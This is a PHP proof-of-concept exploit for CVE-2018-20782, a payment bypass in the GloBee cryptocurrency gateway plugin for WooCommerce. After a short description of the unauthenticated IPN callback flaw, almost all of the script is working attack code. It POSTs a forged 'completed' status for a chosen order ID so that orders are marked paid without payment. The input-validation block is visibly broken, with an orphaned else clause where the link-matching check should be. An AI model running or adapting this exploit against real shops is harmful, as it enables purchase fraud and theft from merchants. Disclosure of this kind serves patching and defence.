
--------------------------------------------------------------

<?php
# Exploit Title: WordPress WooCommerce - GloBee (cryptocurrency) Payment Gateway Plugin [Payment Bypass / Unauthorized Order Status Spoofing]
# Discovery Date: 14.12.2018
# Public Disclosure Date: 14.02.2019
# Exploit Author: GeekHack
# Contact: https://t.me/GeekHack
# Software Link: https://github.com/GloBee-Official/woocommerce-payment-api-plugin/releases/tag/v1.1.1
# Version: <= 1.1.1
# Tested on: WordPress 4.9.9 + WooCommerce 3.5.1 + GloBee Payment Gateway Plugin 1.1.1
# CVE: CVE-2018-20782

/*
  Description:

  Reliance on untrusted inputs (CWE-807), insufficient data verification and lack of any cryptographic authentication (hmac etc) at IPN callback (ipn_callback() function in Gateway.php at 374 line) allow remote (even unauthorized) attacker to bypass payment process and spoof real order status without actually paying for it.

  [code ref: https://github.com/GloBee-Official/woocommerce-payment-api-plugin/blob/8c254d6100ef4cfb3432b219726f4936c1531234/src/Gateway.php#L374]

  Such actions like &#039;changin order status&#039; normally require administrative rights. But in this case anyone can perform these actions, even with the most limited rights, therefor this issue "can" also be considered as a Privilege Escalation (CWE-269) vulnerability (but it&#039;s not quite right, imho).
*/

if(php_sapi_name() !== &#039;cli&#039;)
	die(&#039;Use CLI: php &#039;.__FILE__);
if(!extension_loaded(&#039;curl&#039;))
	die(&#039;cURL extension is required&#039;);

echo &#039;Payment Bypass (CVE-2018-20782) PoC by GeekHack team.&#039;."\n";
echo &#039;Select any product(s) in a vulnerable store and continue checkout through payment via cryptocurrencies (GloBee Payment Gateway).&#039;."\n\n";

$shopURL = rtrim(readline(&#039;Shop root URL (https://shop.example.com/): &#039;), &#039;/&#039;);
if(strpos(@get_headers($shopURL)[0], &#039;200&#039;) === false)
	die(&#039;Shop url is invalid or not exists (or request was blocked), check link format and try again.&#039;);
$paymentLink = readline(&#039;Payment link (https://globee.com/en/payment-request/XXXXXXXXXXXXXXXXXXXXXX): &#039;);
	$paymentID = $matches[1];
}else{
	die(&#039;Payment link is invalid, check link format and try again.&#039;);
}
$orderID = (int)readline(&#039;Order ID: &#039;);
if(!$orderID)
	die(&#039;Order ID is invalid, must be a positive integer, try again.&#039;);

$payload = [ // commented fields are not required for exploitation
	&#039;id&#039; => $paymentID,
	&#039;status&#039; => &#039;completed&#039;,
	//&#039;total&#039; => &#039;123.45&#039;,
	//&#039;currency&#039; => "USD",
	&#039;custom_payment_id&#039; => $orderID,
	//&#039;callback_data&#039; => "example data",
	/*&#039;customer&#039; => [
		&#039;name&#039; => &#039;John Smit&#039;,
		&#039;email&#039; => &#039;john.smit@hotmail.com&#039;
	],*/
	/*&#039;payment_details&#039; => [
		&#039;currency&#039; => &#039;BTC&#039;
	],*/
	//&#039;redirect_url&#039; => &#039;http://globee.com/invoice/&#039;.$paymentID,
	//&#039;success_url&#039; => $shopURL,
	//&#039;cancel_url&#039; => $shopURL,
	//&#039;ipn_url&#039; => $shopURL.&#039;/wc-api/globee_ipn_callback&#039;,
	//&#039;notification_email&#039; => null,
	//&#039;confirmation_speed&#039; => &#039;medium&#039;,
	//&#039;expires_at&#039; => &#039;2018-01-25 12:31:04&#039;,
	//&#039;created_at&#039; => &#039;2018-01-25 12:16:04&#039;
];

$curl = curl_init();
curl_setopt_array($curl, array(
	CURLOPT_URL => $shopURL.&#039;/wc-api/globee_ipn_callback&#039;,
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_ENCODING => "",
	CURLOPT_MAXREDIRS => 2,
	CURLOPT_TIMEOUT => 10,
	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	CURLOPT_CUSTOMREQUEST => &#039;POST&#039;,
	CURLOPT_POSTFIELDS => json_encode($payload),
	CURLOPT_HTTPHEADER => array(
		&#039;cache-control: no-cache&#039;,
		&#039;content-type: application/json&#039;,
	),
));

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

if ($err) {
	echo &#039;cURL Error #: &#039;.$err;
} else {
	echo &#039;Done: &#039;.$response;
}


